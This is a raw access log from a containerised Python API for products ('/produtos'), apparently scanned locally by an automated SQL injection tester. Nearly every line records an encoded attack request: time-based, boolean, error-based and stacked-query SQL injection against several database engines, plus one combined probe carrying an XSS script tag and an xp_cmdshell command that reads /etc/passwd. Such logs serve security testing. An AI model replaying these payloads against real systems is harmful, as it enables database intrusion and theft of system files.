api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:32988 - "GET /produtos%29/%2A%2A/AND/%2A%2A/8483%3D%28SELECT/%2A%2A/8483/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%288569%3D8569 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33004 - "GET /produtos/%2A%2A/AND/%2A%2A/8483%3D%28SELECT/%2A%2A/8483/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33016 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/8483%3D%28SELECT/%2A%2A/8483/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%28%27cCvV%27%3D%27cCvV HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33030 - "GET /produtos%27/%2A%2A/AND/%2A%2A/8483%3D%28SELECT/%2A%2A/8483/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%27TxIJ%27%3D%27TxIJ HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33044 - "GET /produtos/%2A%2A/AND/%2A%2A/8483%3D%28SELECT/%2A%2A/8483/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29--/%2A%2A/YWJb HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33048 - "GET /produtos%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%288031%3D8031 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33060 - "GET /produtos/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33066 - "GET /produtos%27%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%28%27xygj%27%3D%27xygj HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33042 - "GET /produtos%27/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%27aldc%27%3D%27aldc HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33072 - "GET /produtos/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27--/%2A%2A/EaqO HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33088 - "GET /produtos%29/%2A%2A/AND/%2A%2A/9970%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28118%29%7C%7CCHR%2888%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%2C5%29/%2A%2A/AND/%2A%2A/%288471%3D8471 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33098 - "GET /produtos/%2A%2A/AND/%2A%2A/9970%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28118%29%7C%7CCHR%2888%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%2C5%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33108 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/9970%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28118%29%7C%7CCHR%2888%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%2C5%29/%2A%2A/AND/%2A%2A/%28%27nRHW%27%3D%27nRHW HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33120 - "GET /produtos%27/%2A%2A/AND/%2A%2A/9970%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28118%29%7C%7CCHR%2888%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%2C5%29/%2A%2A/AND/%2A%2A/%27JIyk%27%3D%27JIyk HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33128 - "GET /produtos/%2A%2A/AND/%2A%2A/9970%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28118%29%7C%7CCHR%2888%29%7C%7CCHR%28107%29%7C%7CCHR%28112%29%2C5%29--/%2A%2A/iWjE HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33134 - "GET /produtos%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/WQWD HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33146 - "GET /produtos/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/PrwP HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33150 - "GET /produtos%27%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/LrzC HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33158 - "GET /produtos%27/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/ugXA HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:33160 - "GET /produtos/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/YwIA HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:50010 - "POST /produtos HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:50022 - "POST /produtos?KDga=2809%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:50030 - "POST /produtos HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:50076 - "GET /produtos/1 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:50082 - "PUT /produtos/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:50092 - "PUT /produtos/1?hwgi=8264%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:50108 - "PUT /produtos/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:50140 - "GET /produtos/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50152 - "GET /produtos/busca/?nome=teste&Jlfc=8907%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50154 - "GET /produtos/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50166 - "GET /produtos/busca/?nome=4616 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50182 - "GET /produtos/busca/?nome=teste%2C.%29%2C%29%2C%22%27%29%28 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50198 - "GET /produtos/busca/?nome=teste%27wzQFKJ%3C%27%22%3EChfyuf HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50206 - "GET /produtos/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50218 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1614%3D3466%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27mgne%27%3D%27mgne HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50220 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8576%3D3058%2F%2A%2A%2FAND%2F%2A%2A%2F%27GNzj%27%3D%27GNzj HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50230 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F3845%3D7661%2F%2A%2A%2FAND%2F%2A%2A%2F%284405%3D4405 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50228 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6279%3D9587 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50244 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4195%3D7958--%2F%2A%2A%2FNgBq HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50252 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287702%3D5096%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5096%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1190%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50262 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284122%2CCONCAT%280x5c%2C0x71716a6b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284122%3D4122%2C1%29%29%29%2C0x7178627071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Odcd%27%3D%27Odcd HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50272 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284122%2CCONCAT%280x5c%2C0x71716a6b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284122%3D4122%2C1%29%29%29%2C0x7178627071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27WXzh%27%3D%27WXzh HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50274 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284122%2CCONCAT%280x5c%2C0x71716a6b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284122%3D4122%2C1%29%29%29%2C0x7178627071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284379%3D4379 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50282 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284122%2CCONCAT%280x5c%2C0x71716a6b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284122%3D4122%2C1%29%29%29%2C0x7178627071%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50288 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284122%2CCONCAT%280x5c%2C0x71716a6b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284122%3D4122%2C1%29%29%29%2C0x7178627071%29%29--%2F%2A%2A%2FoUgq HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50294 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1806%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281806%3D1806%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27xiRJ%27%3D%27xiRJ HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50300 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1806%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281806%3D1806%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27WiBU%27%3D%27WiBU HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50310 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1806%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281806%3D1806%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283504%3D3504 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50318 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1806%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281806%3D1806%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50326 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1806%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281806%3D1806%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FidCL HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50322 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5300%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285300%3D5300%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27ZVUA%27%3D%27ZVUA HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50338 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F5300%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285300%3D5300%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27gZPx%27%3D%27gZPx HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50346 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5300%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285300%3D5300%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284134%3D4134 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50360 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5300%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285300%3D5300%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50372 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5300%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285300%3D5300%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FwJYh HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50382 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6487%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286487%3D6487%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27TrQS%27%3D%27TrQS HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50398 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6487%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286487%3D6487%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27lHOs%27%3D%27lHOs HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50414 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6487%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286487%3D6487%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282460%3D2460 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50426 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6487%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286487%3D6487%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50436 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6487%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%286487%3D6487%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FfdvT HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50462 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qqjkq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284650%3D4650%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qxbpq%27%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50478 - "GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50482 - "GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50446 - "GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50496 - "GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50498 - "GET /produtos/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50512 - "GET /produtos/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50516 - "GET /produtos/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:50514 - "GET /produtos/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
